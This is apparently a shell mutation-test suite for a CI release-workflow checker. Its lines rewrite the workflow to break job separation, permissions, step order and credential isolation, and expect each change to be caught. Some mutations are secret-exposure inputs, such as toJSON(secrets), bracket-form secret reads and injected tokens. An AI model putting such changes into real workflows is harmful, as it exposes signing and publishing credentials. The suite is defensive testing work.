m s_dig_none  '(  sign-release:\n.*?)      - name: write Build.s digest list to a file\n        env:\n          DIGESTS: [^\n]*\n        run: [^\n]*\n' '\1' 'right after the downloads' "Q-e sign-release does not write Build's digest list"
m s_dig_env   '=          DIGESTS: ${{ needs.build-assemble.outputs.digests }}\n' '          DIGESTS: ${{ needs.release.outputs.digests }}\n' 'must carry' "Q-e sign-release reads the digest list from another job than Build's"
m s_srec_stage '=--stage release ' '--stage check ' 'right after the downloads' "Q-e sign-release checks the records as another stage"
m s_srec_exp  '=--out staged --record-dir rec-release/witness-release-verify' '--expect-digests x.json --out staged --record-dir rec-release/witness-release-verify' 'right after the downloads' "Q-e the release stage's records check takes --expect-digests (it has no list)"
m s_srec_art  '=--out staged --record-dir rec-release/witness-release-verify' '--artifacts-dir artifacts --out staged --record-dir rec-release/witness-release-verify' 'right after the downloads' "Q-e the release stage's records check takes --artifacts-dir (it matches no file)"
m s_srec_one  '= --record-dir rec-release/witness-release-publish\n' '\n' 'right after the downloads' "Q-e the records check names one record folder, not both"
m s_srec_third '= --record-dir rec-release/witness-release-publish\n' ' --record-dir rec-release/witness-release-publish --record-dir rec-release/witness-build\n' 'right after the downloads' "Q-e the records check names a third folder"
m s_srec_oid  '=env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage release' 'python3 -I -B bin/chain-verify.py sign-records --stage release' 'right after the downloads' "Q-e the records check keeps the identity-token request variables (the env -u prefix is gone)"
m s_wr_dl     '(  sign-release:\n.*?)      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: witness-release\n          path: rec-release\n' '\1' 'sign-release job: its downloads' "Q-e sign-release does not download witness-release"
m s_wr_dlpath '=name: witness-release\n          path: rec-release\n' 'name: witness-release\n          path: witness-release\n' 'sign-release job: its downloads' "Q-e sign-release downloads witness-release outside rec-release/"
m s_swr_up    '(  sign-release:\n.*?)      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: signed-witness-release\n          path: signed\n' '\1' 'right after the signing of the staged records' "Q-e sign-release does not upload signed-witness-release"
# Q-f: the upload of signed-witness-release sits between witness-sign-staged and the witnessed steps
SWR='      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: signed-witness-release\n          path: signed\n'
STG='      - name: sign the staged release records\n        run: bash bin/witness-sign-staged.sh staged signed\n'
m s_swr_late   '(  sign-release:\n.*?)'"$SWR"'(.*?      - name: release-sign record holds no token\n        run: [^\n]*\n)' '\1\2'"$SWR" 'before the witnessed steps' "Q-f sign-release uploads signed-witness-release after its witnessed steps, not before them"
m s_swr_mid    '(  sign-release:\n.*?)'"$SWR"'(.*?bin/witnessed.sh release-apks[^\n]*\n)' '\1\2'"$SWR" 'Witness steps only' "Q-f sign-release uploads signed-witness-release between its two witnessed steps"
m s_swr_early  '(  sign-release:\n.*?)'"$STG"'(.*?)'"$SWR" '\1'"$SWR"'\2'"$STG" 'right after the downloads' "Q-f sign-release uploads signed-witness-release before witness-sign-staged ran (an unsigned tree would be uploaded)"
m s_swr_twice  '(  sign-release:\n.*?'"$SWR"')' '\1'"$SWR" 'right after the signing of the staged records' "Q-f sign-release uploads signed-witness-release twice"
m s_pol_dot    '=          name: release-policy\n          path: release-policy\n' '          name: release-policy\n          path: .\n' 'download-artifact' "T3 release-evidence downloads release-policy into the working directory, not its own folder"

m s_re_loc  '=record-env --record witness-release-assets/release-assets-collection.local.json' 'record-env --record witness-release-assets/release-assets-collection.json' 'none of checkout' "AC12 (R4) release-evidence checks the signed form of a record its throwaway-key step never made"
m s_re_path '=record-env --record witness-release-publish/release-publish-collection.local.json' 'record-env --record witness-release-publish/release-verify-collection.local.json' 'none of checkout' "AC12 (R4) a record check that reads another step's record"
m s_re_swallow '=record-env --record witness-release-publish/release-publish-collection.local.json' 'record-env --record witness-release-publish/release-publish-collection.local.json || true' 'none of checkout' "AC12 (R4) a record check whose failure is swallowed"
m s_vre_none '      - name: release-verify record holds no token[^\n]*\n        run: python3 -I bin/chain-verify\.py record-env --record witness-release-verify/release-verify-collection\.local\.json\n' '' 'verify job: right after' "AC12 (R4) the verify job uploads its Witness record without checking it for a token"
m s_vre_if '(      - name: release-verify record holds no token[^\n]*\n)' '\1        if: true\n' 'no env, no if' "AC12 (R4) the verify job's record check carries an if"
m s_swap    'install cosign\n        run: bash bin/install-scanner.sh cosign\n      - name: install crane\n        run: bash bin/install-scanner.sh crane' 'install crane\n        run: bash bin/install-scanner.sh crane\n      - name: install cosign\n        run: bash bin/install-scanner.sh cosign' 'start with checkout' "AC1 the installs in another order"
m s_nocos   '      - name: install cosign\n        run: bash bin/install-scanner.sh cosign\n' ''                                                                    'start with checkout' "AC1 cosign is not installed"
m s_noaws   '=      - name: install aws-cli\n        run: bash bin/install-scanner.sh aws-cli\n' ''                                                                    'start with checkout' "KA-2 p4 group 4 the aws CLI is not installed in sign-release (the KMS-signing steps would find none)"
m s_relaws  '(  release:\n.*?install crane\n        run: bash bin/install-scanner.sh crane\n)' '\1      - name: install aws-cli\n        run: bash bin/install-scanner.sh aws-cli\n' 'no install after them' "ruling 1 the release job installs the aws CLI (it holds no KMS role)"
m s_awsdest 'install-scanner.sh aws-cli' 'install-scanner.sh aws-cli /usr/local/bin'                                                                    'none of checkout' "KA-2 p4 group 4 the aws CLI install with a destination argument (it installs job-locally under RUNNER_TEMP and takes none) is not a form of the grammar"
m s_snyk    'install-scanner.sh crane'                      'install-scanner.sh snyk'                                'none of checkout'   "AC1 an install of a tool outside the three"
m s_melnew  'install crane\n        run: bash bin/install-scanner.sh crane\n' 'install crane\n        run: bash bin/install-scanner.sh crane\n      - name: install melange\n        run: bash bin/install-build-tools.sh melange\n' 'none of checkout' "AC1 the release job installs no build tool: a melange install after crane is refused (the apks are signed through cosign)"
m s_melwit  'install witness\n        run: bash bin/install-scanner.sh witness\n      - name: install cosign' 'install witness\n        run: bash bin/install-scanner.sh witness\n      - name: install melange\n        run: bash bin/install-build-tools.sh melange\n      - name: install cosign' 'none of checkout' "AC1 a melange install between witness and cosign is refused"
m s_apkoinst 'install crane\n        run: bash bin/install-scanner.sh crane\n' 'install crane\n        run: bash bin/install-scanner.sh crane\n      - name: install apko\n        run: bash bin/install-build-tools.sh apko\n' 'none of checkout' "AC1 an apko install after crane is refused (the release job installs no build tool)"
m s_melscan2 'install crane\n        run: bash bin/install-scanner.sh crane\n' 'install crane\n        run: bash bin/install-scanner.sh crane\n      - name: install melange\n        run: bash bin/install-scanner.sh melange\n' 'none of checkout' "AC1 melange fetched by the scanner installer after crane is refused"
m s_btcos   'install cosign\n        run: bash bin/install-scanner.sh cosign' 'install cosign\n        run: bash bin/install-build-tools.sh cosign' 'none of checkout' "AC1 cosign fetched by the build-tools installer is refused (the three tools come from the scanner installer)"
# REQ-CHAIN-007-AC1 (Astra R6): two jobs, verify and release
m s_vwrite   '=  release-verify:\n    needs: release-compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  release-verify:\n    needs: release-compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: write\n'  'verify'  "AC1 (Astra R6) the verify job holds contents write"
m s_vpkg     '=  release-verify:\n    needs: release-compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  release-verify:\n    needs: release-compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      packages: write\n'  'verify'  "AC1 (Astra R6) the verify job holds packages write"
m s_vnoid    '=  release-verify:\n    needs: release-compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  release-verify:\n    needs: release-compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      id-token: write\n'  'verify'  "AC1 (handoff 0713 P2) the verify job holds id-token write (it runs the local Witness script and must not be able to assume the signing role)"
m s_venv     '=  release-verify:\n    needs: release-compare\n    runs-on: ubuntu-24.04\n' '  release-verify:\n    needs: release-compare\n    environment: release\n    runs-on: ubuntu-24.04\n'  'verify'  "AC1 (Astra R6) the verify job is in the release environment (it would see its secrets)"
m s_vcos     '=install witness\n        run: bash bin/install-scanner.sh witness\n      - uses' 'install witness\n        run: bash bin/install-scanner.sh witness\n      - name: install cosign\n        run: bash bin/install-scanner.sh cosign\n      - uses' 'verify' "AC1 (Astra R6) the verify job installs a tool it does not need"
m s_vnorv    'release-verify bin/release-verify.sh'            'release-apks bin/release-apks.sh'                                      'verify'  "AC1 (Astra R6) the verify job's Witness step is not release-verify"
m s_vgone    '(?s)  release-verify:\n.*?(?=  release:\n)'              ''                                                                      'verify'  "AC1 (Astra R6) there is no verify job (the credentials job would verify only in itself)"
m s_rnoneeds '=  release:\n    needs: [release-verify, release-compare]\n' '  release:\n'                                                          'needs'   "AC1 (Astra R6) the release job does not need verify"
m s_rneedsot '=needs: [release-verify, release-compare]'                       'needs: build'                                                          'needs'   "AC1 (Astra R6) the release job needs another job than verify"
m s_rnoif    '(  release:\n    needs: \[release-verify, release-compare\]\n)    if: [^\n]*\n' '\1'                                                   'job'     "AC1 (Astra R6) the release job is not skipped for a release candidate (it would enter the environment for an rc)"
for jn in release sign-release release-evidence; do
  m "s_${jn}_nrc" "(  ${jn}:\n.*?)&& !contains\(github\.ref_name, .-.\) \}\}" '\1}}' 'carry exactly the job-level if' "AC14 the job $jn has no release-candidate rule in its if (guard S alone would run it for an rc)"
  m "s_${jn}_npush" "(  ${jn}:\n.*?)github\.event_name == .push. && " '\1' 'carry exactly the job-level if' "AC14 the job $jn is not guarded by a push in its if (guard S is cut)"
done

# ---- the owner's rule of Oct 21 2026 (ops/docs/ratify/2026-10-21-signer-builder-separate-jobs.md): the comparison of Build's and Rebuild's apks is the `compare` job, which holds no key, no token and
# no environment; the jobs that hold the id-token or the signing key and the publish credentials never receive a rapk, and each build is its own job (the compare job runs no build script) ------------
m c_norel   '=needs: [release-verify, release-compare]'                        'needs: release-verify'                                         'needs'   "SIGNER the release job does not need the compare job"
m c_novneed '=  release-verify:\n    needs: release-compare\n'                  '  release-verify:\n'                                           'needs'   "SIGNER the verify job does not need the compare job"
m c_order   '=  release-compare:\n'                                    '  zzz:\n'                                              'no job release-compare'  "SIGNER the compare job is missing (a job of another name stands in)"
m c_nocneed '=    needs: [check, sign, sign-rebuild, sign-check]\n'  ''                                                       'compare job'  "SIGNER the compare job does not wait for the signed records it reads"
m c_env     '=  release-compare:\n    runs-on: ubuntu-24.04\n'           '  release-compare:\n    environment: release\n    runs-on: ubuntu-24.04\n' 'compare job' "SIGNER the compare job is in the release environment"
m c_nosigned '=      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: signed-witness-rapk-ubuntu-24.04-arm\n          path: witness-rapk-ubuntu-24.04-arm\n' '' 'exactly' "SIGNER the compare job lacks the signed rapk record of the arm runner (it could not bind Rebuild's apks to a record Sign signed)"
m c_badpath '=          name: signed-witness-rapk-ubuntu-24.04\n          path: witness-rapk-ubuntu-24.04\n' '          name: signed-witness-rapk-ubuntu-24.04\n          path: rapks/ubuntu-24.04\n' 'exactly' "SIGNER the signed rapk record is downloaded over the rapk files"
m c_idt     '=  release-compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  release-compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      id-token: write\n' 'compare job' "SIGNER the compare job holds the id-token (an OIDC token can get a signing certificate)"
m c_wr      '=  release-compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  release-compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: write\n' 'compare job' "SIGNER the compare job holds contents write"
m c_pk      '=  release-compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  release-compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      packages: write\n' 'compare job' "SIGNER the compare job holds packages write"
m c_self    '=  release-compare:\n    runs-on: ubuntu-24.04\n'           '  release-compare:\n    runs-on: self-hosted\n'               'compare job' "SIGNER the compare job runs on a self-hosted runner"
m c_jenv    '=  release-compare:\n    runs-on: ubuntu-24.04\n'           '  release-compare:\n    env: {X: y}\n    runs-on: ubuntu-24.04\n' 'compare job' "SIGNER a job env on the compare job"
m c_senv    '=        run: bash bin/release-compare.sh\n'         '        env:\n          X: y\n        run: bash bin/release-compare.sh\n' 'compare job' "SIGNER an env on the compare step"
m c_sec     '=        run: bash bin/release-compare.sh\n'         '        env:\n          GH_TOKEN: ${{ secrets.X }}\n        run: bash bin/release-compare.sh\n' 'compare job' "SIGNER a secret on the compare step"
m c_wit     '=        run: bash bin/release-compare.sh\n'         '        run: bash bin/witnessed.sh release-compare bin/release-compare.sh\n' 'compare job' "SIGNER the compare step through Witness (Witness signs through the id-token the job must not hold)"
m c_build   '=        run: bash bin/release-compare.sh\n'         '        run: bash bin/build-apk.sh --out x\n'   'compare job' "SIGNER a build script in the compare job (each build is its own job)"
m c_if      '=        run: bash bin/release-compare.sh\n'         "        if: \${{ always() }}\n        run: bash bin/release-compare.sh\n" 'compare job' "SIGNER an if on the compare step (it could be skipped)"
m c_2steps  '=        run: bash bin/release-compare.sh\n'         '        run: bash bin/release-compare.sh\n      - run: echo hi\n' 'compare job' "SIGNER a second step in the compare job"
m c_norapk  '=      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: rapk-ubuntu-24.04-arm\n          path: rapks/ubuntu-24.04-arm\n' '' 'compare job' "SIGNER the compare job does not receive Rebuild's arm64 apks"
m c_dlimg   '=      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: rapk-ubuntu-24.04-arm\n          path: rapks/ubuntu-24.04-arm\n' '      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: images\n          path: images\n' 'compare job' "SIGNER the compare job downloads an artifact it does not compare (images)"
m c_upname  '=          name: apk-compare\n          path: apk-compare\n          if-no-files-found: error\n' '          name: release-evidence\n          path: apk-compare\n          if-no-files-found: error\n' 'compare job' "SIGNER the compare job uploads under another name"
m c_upopt   '=          name: apk-compare\n          path: apk-compare\n          if-no-files-found: error\n' '          name: apk-compare\n          path: apk-compare\n' 'compare job' "SIGNER the compare upload may succeed with no file (if-no-files-found is not error)"
m r_rapk    'name: dist\n          path: dist'                'name: rapk-ubuntu-24.04\n          path: rapks/ubuntu-24.04' 'download'  "SIGNER the release job downloads a rapk (Rebuild's apks reach the signer)"
m v_nocmp   '=      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: apk-compare\n          path: apk-compare\n' '' 'download'  "SIGNER the verify job does not download the comparison result (the first occurrence: release-verify would have nothing to read)"
m r_nocmp   '(name: apk-compare\n          path: apk-compare\n.*?)      - uses: [^\n]*\n        with:\n          name: apk-compare\n          path: apk-compare\n' '\1' 'download'  "SIGNER the release job does not download the comparison result"
m s_rnorv    '(  release:\n.*?)      - name: release-verify\n        run: bash bin/witnessed-local.sh release-verify bin/release-verify.sh\n' '\1' 'exactly' "AC1 (Astra R6) the release job's first witnessed step is not release-verify (no re-run before the credentials)"
# round 1 (Codex seat B): the steps between the first and last Witness step are Witness steps and nothing else, and an install never comes after the first four
m s_latemel '(  release:\n.*?)run:\ bash\ bin/witnessed\-local\.sh\ release\-verify\ bin/release\-verify\.sh\n\ \ \ \ \ \ \-\ name:\ release\-publish' '\1run: bash bin/witnessed-local.sh release-verify bin/release-verify.sh\n      - name: install melange again\n        run: bash bin/install-build-tools.sh melange\n      - name: release-publish' 'none of checkout' "AC1 the release job installs no build tool: a melange install between release-verify and release-publish is refused"
m s_latecos  '=run: bash bin/witnessed.sh release-apks bin/release-apks.sh\n' 'run: bash bin/witnessed.sh release-apks bin/release-apks.sh\n      - name: install cosign again\n        run: bash bin/install-scanner.sh cosign\n' 'between' "AC1 (Astra R4, round 1) an install between two Witness steps"
m s_latedl '(  release:\n.*?)run:\ bash\ bin/witnessed\-local\.sh\ release\-verify\ bin/release\-verify\.sh\n\ \ \ \ \ \ \-\ name:\ release\-publish' '\1run: bash bin/witnessed-local.sh release-verify bin/release-verify.sh\n      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: images\n          path: images\n      - name: release-publish' downloads "AC1 (Astra R4, round 1) a download between release-verify and release-publish"
# round 1 (Codex PR 415): the verify job's proof upload is exactly witness-release-verify holding the record directory
m s_vupname  '=name: witness-release-verify\n          path: witness-release-verify' 'name: witness-release\n          path: witness-release-verify' 'verify' "AC1 (Astra R6, round 1) the verify job's upload is named witness-release (it would collide with the release job's)"
m s_vuppath  '=name: witness-release-verify\n          path: witness-release-verify' 'name: witness-release-verify\n          path: docs' 'verify' "AC1 (Astra R6, round 1) the verify job's upload holds a path other than its Witness record"
# round 2 (Codex PR 415): the verify job's upload and downloads are exact
m s_vupwarn  '=          path: witness-release-verify\n          if-no-files-found: error\n' '          path: witness-release-verify\n' 'verify' "AC1 (Astra R6, round 2) the verify job's upload does not fail when it finds no file (the default is a warning)"
m s_vdist    '=      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: signed-witness-build\n' '      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: dist\n          path: witness-release-verify\n      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: signed-witness-build\n' 'verify' "AC1 (Astra R6, round 2) the verify job downloads dist into its proof directory (it would be uploaded with the record)"
# round 3 (Codex PR 415, a reproduced blocker): download-artifact trims its path input, so a padded path reached the directory the verify job uploads; the verify job's downloads are the exact nine pairs, and no download path has surrounding whitespace
m s_vws      '=      - name: release-verify\n' '      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: digests\n          path: " witness-release-verify"\n      - name: release-verify\n' 'verify' "AC1 (Astra R6, round 3) a download into ' witness-release-verify' (the action trims the path) puts digests.json into the uploaded directory"
m s_vtrail   '=          name: signed-witness-build\n          path: witness-build\n' '          name: signed-witness-build\n          path: "witness-build "\n' 'verify' "AC1 (Astra R6, round 3) a download path with trailing whitespace"
m s_vdupdl   '=          name: provenance\n          path: provenance\n' '          name: provenance\n          path: provenance\n      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: provenance\n          path: provenance\n' 'verify' "AC1 (Astra R6, round 3) the same artifact downloaded twice in the verify job"
m s_vpair    '=          name: check-results-ubuntu-24.04\n          path: check-results/ubuntu-24.04\n' '          name: check-results-ubuntu-24.04\n          path: witness-check/ubuntu-24.04\n' 'verify' "AC1 (Astra R6, round 3) a verify download into another artifact's directory"
m s_rws      '=          name: images\n          path: images\n' '          name: images\n          path: " bin"\n' 'download' "AC1 (Astra R6, round 3) a release-job download whose padded path the action trims into bin/"
# round 4 (Codex PR 415): the release job's downloads are the exact fifteen pairs too (its upload witness-release holds the Witness record directories)
m s_rdupdl   '=          name: dist\n          path: dist\n' '          name: dist\n          path: dist\n      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: dist\n          path: dist\n' 'release job' "AC1 (Astra R6, round 4) the release job downloads dist twice"
m s_rpair    '=          name: dist\n          path: dist\n' '          name: dist\n          path: witness-release-publish\n' 'release job' "AC1 (Astra R6, round 4) dist is downloaded into a Witness record directory of the release job's upload"
m s_rmissdl  '=      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: images\n          path: images\n' '' 'release job' "AC1 (Astra R6, round 4) the release job does not download the images"
m s_order   'release-apks bin/release-apks.sh'              'release-sign bin/release-sign.sh'                       'exactly'            "AC1 two witnessed steps swapped (release-sign twice)"
m s_miss    '=      - name: release-assets\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed-local.sh release-assets bin/release-assets.sh\n' '' 'exactly' "AC1 a witnessed step missing from release-evidence"
m s_nopv    '=      - name: release-postverify\n        run: bash bin/witnessed-local.sh release-postverify bin/release-postverify.sh\n' '' 'exactly' "AC1 (rule 79) the post-publish verification step missing from release-evidence"
m s_pvfirst 'release-postverify bin/release-postverify.sh'  'release-apks bin/release-apks.sh'                       'exactly'            "AC1 (rule 79) the post-publish step is not a witnessed step of its own (release-apks twice)"
m s_ifver   '=      - name: release-verify\n' '      - name: release-verify\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n' 'no if' "AC14 a witnessed step with its own if (the job-level if alone ends a release candidate; a step condition could skip the tag rule)"
m s_seven   '=      - name: release-postverify\n        run: bash bin/witnessed-local.sh release-postverify bin/release-postverify.sh\n' '      - name: release-postverify\n        run: bash bin/witnessed-local.sh release-postverify bin/release-postverify.sh\n      - name: release-extra\n        run: bash bin/witnessed-local.sh release-extra bin/release-extra.sh\n' 'exactly' "AC1 (rule 79) a witnessed step after the post-publish one is refused: release-evidence has exactly two"
m s_pvmid   'run: bash bin/witnessed-local.sh release-assets bin/release-assets.sh' 'run: bash bin/witnessed-local.sh release-postverify bin/release-postverify.sh' 'exactly' "AC1 (rule 79) the post-publish step before the assets step is refused: it is the last"
m s_evwit   '=bash bin/witnessed-local.sh release-assets bin/release-assets.sh' 'bash bin/witnessed.sh release-assets bin/release-assets.sh' 'none of checkout' "ruling 2 release-evidence runs release-assets through bin/witnessed.sh, which needs the KMS role it has none of"
m s_evid    '(  release-evidence:\n.*?contents: write\n)' '\1      id-token: write\n' 'permissions' "ruling 2 release-evidence holds an id-token"
m s_evenv   '(  release-evidence:\n.*?    runs-on: ubuntu-24.04\n)' '\1    environment: sign\n' 'environment' "ruling 2 release-evidence is in the sign environment"
m s_evjenv  '(  release-evidence:\n.*?    runs-on: ubuntu-24.04\n)' '\1    env:\n      AWS_REGION: us-east-1\n' 'job keys' "ruling 2 release-evidence carries a job env"
m s_evneeds '=  release-evidence:\n    needs: sign-release\n' '  release-evidence:\n    needs: release\n' 'needs' "ruling 2 release-evidence does not wait for sign-release"
m s_evaws   '(  release-evidence:\n.*?install crane\n        run: bash bin/install-scanner.sh crane\n)' '\1      - name: install aws-cli\n        run: bash bin/install-scanner.sh aws-cli\n' 'no install after them' "ruling 2 release-evidence installs the aws CLI (it holds no KMS role)"
m s_sgnoenv '=    environment: sign\n' ''                                                                                  'environment' "ruling 1 sign-release is not in the environment sign"
m s_sgenv   '=    environment: sign\n' '    environment: release\n'                                                        'environment' "ruling 1 sign-release is in the release environment"
m s_sgnoid  '=      id-token: write\n' ''                                                                                   'permissions' "ruling 1 sign-release has no id-token (it could not reach the KMS key)"
m s_sgnopkg '(  sign-release:\n.*?)      packages: write\n' '\1'                                                              'permissions' "AC3 sign-release has no packages write (it attaches the signatures and attestations)"
m s_sgcont  '(  sign-release:\n.*?)contents: read' '\1contents: write'                                                      'permissions' "AC3 sign-release holds contents write"
m s_sgneeds '=  sign-release:\n    needs: [build-assemble, release]\n' '  sign-release:\n    needs: release-verify\n'                          'needs' "ruling 1 sign-release does not wait for release"
m s_sgup    '=name: release-checksums\n          path: dist/checksums.txt' 'name: release-checksums\n          path: dist' 'upload-artifact' "AC1 sign-release uploads more than the checksums file"
m s_extra '(  release:\n.*?)run: bash bin/witnessed-local.sh release-verify bin/release-verify.sh' '\1run: bash bin/witnessed-local.sh release-verify bin/release-verify.sh && echo done' 'none of checkout' "AC1 an extra command in a witnessed step"
m s_mism    'release-publish bin/release-publish.sh'        'release-publish bin/release-sign.sh'                    'none of checkout'   "AC1 a witnessed step running another script"
m s_direct '(  release:\n.*?)run: bash bin/witnessed-local.sh release-verify bin/release-verify.sh' '\1run: witness run --step release-verify -- bash bin/release-verify.sh' 'none of checkout' "AC1 a direct witness run (the helper is the one seam)"
m s_ghs     '      - name: install witness'                 '      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n      - name: install witness' 'uses not allowed' "AC1 github-script"
m s_comp    '      - name: install witness'                 '      - uses: ./.github/actions/x\n      - name: install witness' 'uses not allowed' "AC1 a local composite action"
m s_login   '      - name: install witness'                 '      - name: login\n        run: echo x | docker login ghcr.io -u u --password-stdin\n      - name: install witness' 'none of checkout' "AC1 a registry login step"
m s_dlafter '      - name: release-assets'                  '      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: dist\n          path: late\n      - name: release-assets' 'downloads' "AC1 a download after Witness started (rule 68)"
# ---- AC2: who holds which credential ----------------------------------------------------------------------------------------
c() { if mutate "$work/stage.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" credentials "$work/$1.yml"; fi; }
c c_pvtok   '=        run: bash bin/witnessed-local.sh release-postverify' '        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed-local.sh release-postverify' 'release-postverify' "AC2 (REQ-CHAIN-007-AC2, KL-1) the post-publish step holds no token: GH_TOKEN on release-postverify is refused"
c c_vsec    '=      - name: release-verify\n'                       '      - name: release-verify\n        env:\n          GH_TOKEN: ${{ github.token }}\n' 'verify job' "AC2 (Astra R6) the verify job's Witness step carries the token (the verify job holds no credential)"
c c_rcos    '=      - name: install cosign\n        run: bash bin/install-scanner.sh cosign\n' '      - name: install cosign\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/install-scanner.sh cosign\n' 'up to release-verify' "AC2 (Astra R6) the release job reads the token before its re-run of release-verify"
c c_rdlsec  '=name: dist\n          path: dist'                   'name: dist\n          path: dist\n          token: ${{ secrets.DOCKERHUB_TOKEN }}' 'up to release-verify' "AC2 (Astra R6) the release job reads a secret in a download before its re-run of release-verify"
c c_vbrk    '=      - name: install witness\n'                      '      - name: x ${{ secrets["OTHER_SECRET"] }}\n'                       'verify job' "AC2 (Astra R6, round 1) the verify job reads a secret through the bracket form in a step name"
c c_rbrk    '=      - name: install cosign\n'                       '      - name: x ${{ github["token"] }}\n'                                'up to release-verify' "AC2 (Astra R6, round 1) the release job reads the token through the bracket form before its re-run of release-verify"
c c_vjson   '=      - name: install witness\n'                      '      - name: x ${{ toJSON(github) }}\n'                                  'verify job' "AC2 (Astra R6, round 2) the verify job holds an expression (the whole github context)"
c c_rjson   '=      - name: install cosign\n'                       '      - name: x ${{ toJSON(secrets) }}\n'                                 'up to release-verify' "AC2 (Astra R6, round 2) the release job holds an expression (all secrets) before its re-run of release-verify"
c c_vsq     '=      - name: install witness\n'                      '      - name: "x ${{ github['\''token'\''] }}"\n'                            'verify job' "AC2 (Astra R6, round 2) the verify job reads the token through the single-quoted bracket form (the executable one)"
c c_rsq     '=      - name: install cosign\n'                       '      - name: "x ${{ secrets['\''DOCKERHUB_TOKEN'\''] }}"\n'                  'up to release-verify' "AC2 (Astra R6, round 2) the release job reads a secret through the single-quoted bracket form before its re-run of release-verify"
c c_vwrap   '=      - name: install witness\n'                      '      - name: x ${{ format('\''{0}'\'', github) }}\n'                          'verify job' "AC2 (Astra R6, round 2) the verify job passes the github context through format()"
c c_chk     'persist-credentials: false'                   'persist-credentials: false\n        env:\n          GH_TOKEN: ${{ github.token }}' 'compare job' "AC2 the token on the compare job's checkout step"
c c_chkr    '(  release:\n.*?    steps:\n      - uses: [^\n]*\n        with:\n          persist-credentials: false)' '\1\n        env:\n          GH_TOKEN: ${{ github.token }}' 'up to release-verify' "AC2 the token on the release job's checkout step"
c c_dlsec   'name: images\n          path: images'        'name: images\n          path: images\n          token: ${{ secrets.DOCKERHUB_TOKEN }}' 'up to release-verify' "AC2 a secret in a download"
c c_vfy     '      - name: release-verify\n'               '      - name: release-verify\n        env:\n          GH_TOKEN: ${{ github.token }}\n' 'up to release-verify' "AC2 any env on the verify step"
c c_apkpub  '=DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed-local.sh release-publish' 'DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n          GH_TOKEN: ${{ github.token }}\n          OTHER_KEY: ${{ secrets.OTHER_KEY }}\n        run: bash bin/witnessed-local.sh release-publish' 'release-publish' "AC2 a secret that no row names in the publish step"
c c_hubapk  '=        run: bash bin/witnessed.sh release-apks bin/release-apks.sh' '        env:\n          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n        run: bash bin/witnessed.sh release-apks bin/release-apks.sh' 'release-apks' "AC2 a registry token in the apk step"
c c_assets  '=      - name: release-assets\n        env:\n          GH_TOKEN: ${{ github.token }}\n' '      - name: release-assets\n' 'release-assets' "AC2 the assets step without its token"
c c_assreg  '=          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed-local.sh release-assets' '          GH_TOKEN: ${{ github.token }}\n          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n        run: bash bin/witnessed-local.sh release-assets' 'release-assets' "AC2 a registry token in the assets step"
c c_ghsec   '=          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed-local.sh release-assets' '          GH_TOKEN: ${{ secrets.OTHER }}\n        run: bash bin/witnessed-local.sh release-assets' 'whole read' "AC2 GH_TOKEN from another secret"
